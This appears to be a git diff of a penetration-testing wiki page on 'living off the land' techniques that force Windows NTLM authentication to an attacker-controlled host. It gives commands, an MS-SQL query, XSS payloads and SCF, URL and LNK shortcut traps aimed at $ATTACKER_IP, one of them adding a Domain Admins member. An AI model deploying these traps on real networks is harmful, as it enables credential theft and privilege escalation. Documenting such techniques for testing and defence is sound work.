@@ -1,45 +1,149 @@
 # 🛠️ Living off the land
 
-Using tools already there, command execution, code execution, to create trafic and capture hashes or relay authentications.
+{% hint style="danger" %}
+**This is a work-in-progress**. It's indicated with the 🛠️ emoji in the page name or in the category name
+{% endhint %}
 
-An attacker able to execute code or commands on a machine can make it authenticate somewhere in many ways.
+## Theory
 
-| Type | Command/code | Outgoing protocol |
-| :--- | :--- | :--- |
-| DOS/Powershell | `dir \\$ATTACKER_IP\unicorn` | SMB |
-| from a file explorer | `\\$ATTACKER_IP\something` | SMB |
-| from a browser | `http://ATTACKER_IP/` | HTTP |
-| MS-SQL | `EXEC master.sys.xp_dirtree '\\$ATTACKER_IP\unicorn',1, 1` | SMB |
+> In the physical world, “living off the land” simply means to survive only by the resources that you can harvest from the natural land. There may be multiple reasons for doing this — perhaps you want to get “off the grid,” or maybe you have something or someone to hide from. Or maybe you just like the challenge of being self-sufficient. 
+>
+> In the technology world, “living off the land” \(LotL\) refers to attacker behavior that uses tools or features that already exist in the target environment. \([source](https://logrhythm.com/blog/what-are-living-off-the-land-attacks/)\)
 
-SCF, LNK, .URL etc.
+There are multiple "living off the land" techniques that can be used to force authentications, to capture hashes, or to relay authentications. In order to use those techniques, testers need to have an initial access to "the land", i.e. the tools or features the technique uses.
 
+## Practice
 
+Those techniques will usually generate outgoing traffic on SMB or HTTP, hence requiring the attacker to set up an SMB or HTTP server to [capture](../abusing-lm-and-ntlm/capturing-hashes.md) or [relay](../abusing-lm-and-ntlm/relay.md) the authentication \(e.g. using tools like [Responder](https://github.com/SpiderLabs/Responder) \(Python\), [Inveigh](https://github.com/Kevin-Robertson/Inveigh) \(Powershell\), [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) \(Python\) or [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh) \(Powershell\)\).
 
-XSS \(like `<script>language='javascript' src='\\$ATTACKER_IP\something'</script>`\)
+### Command execution
 
-Other attacks that allow to edit the website content and make browsers request the attacker
+On Windows machines, cmdlets like `net` or `dir` can be used to make the machine access a remote resource, hence making it authenticate. This leads to an outgoing traffic using SMB.
 
-SMB trap etc. HTTP server sends 302 redirect to file://attacker\_ip/something
+```bash
+dir \\$ATTACKER_IP\something
+net use \\$ATTACKER_IP\something
+```
 
-[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
+### MS-SQL queries execution
 
+On MS-SQL \(Microsoft SQL\) servers, the EXEC method can be used to access a remote SMB share. This leads to an outgoing traffic using SMB.
 
+```bash
+EXEC master.sys.xp_dirtree '\\$ATTACKER_IP\something',1,1
+```
 
-.XML, IncludePicture Field \(Word\), hyperlink
+### File explorer
 
+On Windows machines, the file explorer can be used to access remote resources like SMB shares by supplying its UNC path \(i.e. `\\$ATTACKER_IP\something`\) in the research bar. This leads to an outgoing traffic using SMB.
 
+### Internet browser
 
-[https://github.com/3gstudent/Worse-PDF](https://github.com/3gstudent/Worse-PDF) [https://github.com/deepzec/Bad-Pdf](https://github.com/deepzec/Bad-Pdf)
+Internet browsers can access HTTP servers by supplying their URL \(i.e. `http://$IP:$PORT/something`\) in the research bar. This technique is rarely used as it can pop up a prompt. This leads to an outgoing traffic using HTTP.
 
+### HTML documents / XSS
 
+HTML documents can be crafted \(or injected with content when successfully exploiting an HTML injection attack such as an [Cross-Site Scripting](../../../web-services/attacks-on-inputs/xss-cross-site-scripting.md)\) in way that could make browsers authenticate when accessing a remote resource. This leads to an outgoing traffic using SMB.
+
+```markup
+<script>
+    language='javascript' src="\\$ATTACKER_IP\something\something.js"
+</script>
+```
+
+```markup
+<img src="file://$ATTACKER_IP/something/something.png"/>
+```
+
+### Web server file inclusion
+
+[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
+
+### Shortcut files \(scf, lnk, url\)
+
+SMB shares can be trapped with shortcut files that will automatically be handled by Windows' file explorer \(e.g. a URL shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary\). This leads to an outgoing traffic using SMB.
+
+{% hint style="info" %}
+Shortcut file names can be preprended with a `@` symbol to put them on top of the share, to make sure the file explorer has to parse it.
+{% endhint %}
+
+{% tabs %}
+{% tab title=".lnk" %}
+An LNK shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary.
+
+> Shortcuts with the .lnk extension have a lot of beneficial properties when it comes to stealth; [they are an exception](https://en.wikipedia.org/wiki/Shortcut_%28computing%29#Microsoft_Windows) from the Windows setting to show or hide file extensions. Even when “hide known file extensions” is disabled, explorer.exe will only show the name, allowing us to let it end in “.jpeg”. A major downside is that they only allow 1024 characters for the whole command they execute. \([source](https://hatching.io/blog/lnk-hta-polyglot/)\)
+
+[LNKUp](https://github.com/Plazmaz/LNKUp) \(Python\) is a great tool to generate malicious LNK shortcuts. They can be set with a remote icon file to generate outgoing SMB traffic and authentications but can also be set to execute commands when opened \(i.e. double-clicked\).
+
+```bash
+# Simple SMB trap with remote icon file
+LNKUp.py --host $ATTACKER_IP --type ntlm --output '@CONFIDENTIAL-ACCOUNTS.txt.lnk'
+
+# SMB trap + command execution
+LNKUp.py --host $ATTACKER_IP --type ntlm --output '@CONFIDENTIAL-ACCOUNTS.txt.lnk' --execute "net group 'Domain Admins' Pentester01 /domain /add"
+```
+
+{% hint style="info" %}
+**Advanced traps**
+
+* LNK files can be mixed with some VBA: [Pwned by Shortcut](https://medium.com/secjuice/pwned-by-a-shortcut-b21473970944)
+* LNK files can be mixed with some HTA: [LNK HTA Polyglot](https://hatching.io/blog/lnk-hta-polyglot/)
+{% endhint %}
+{% endtab %}
+
+{% tab title=".scf" %}
+An SCF shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary.
+
+{% code title="@CONFIDENTIAL-ACCOUNTS.scf" %}
+```bash
+[Shell]
+Command=2
+IconFile=\\$ATTACKER_IP\something\something.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title=".url" %}
+A URL shortcut using an icon file located on a remote SMB share will be parsed by the file explorer that will request the icon file and authenticate if necessary.
+
+{% code title="@CONFIDENTIAL-ACCOUNTS.url" %}
+```bash
+[InternetShortcut]
+URL=https://www.thehacker.recipes/
+IconIndex=0
+IconFile=\\$ATTACKER_IP\something\something.ico
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
+
+### PDF documents
+
+[https://github.com/deepzec/Bad-Pdf](https://github.com/deepzec/Bad-Pdf)
+
+[https://github.com/3gstudent/Worse-PDF](https://github.com/3gstudent/Worse-PDF)
+
+### RTF documents
+
+### MS Word documents
+
+## Resources
+
+{% embed url="https://hatching.io/blog/lnk-hta-polyglot/" %}
+
+{% embed url="https://logrhythm.com/blog/what-are-living-off-the-land-attacks/" %}
+
+{% embed url="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" %}
+
+{% embed url="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" %}
 
 [https://github.com/Gl3bGl4z/All\_NTLM\_leak](https://github.com/Gl3bGl4z/All_NTLM_leak)
 
 [https://mgp25.com/research/infosec/Leaking-NTLM-hashes/](https://mgp25.com/research/infosec/Leaking-NTLM-hashes/)
 
 [https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes\#office](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes#office)
-
-[https://logrhythm.com/blog/what-are-living-off-the-land-attacks/](https://logrhythm.com/blog/what-are-living-off-the-land-attacks/)
 
 [https://www.ired.team/offensive-security/initial-access](https://www.ired.team/offensive-security/initial-access)
 
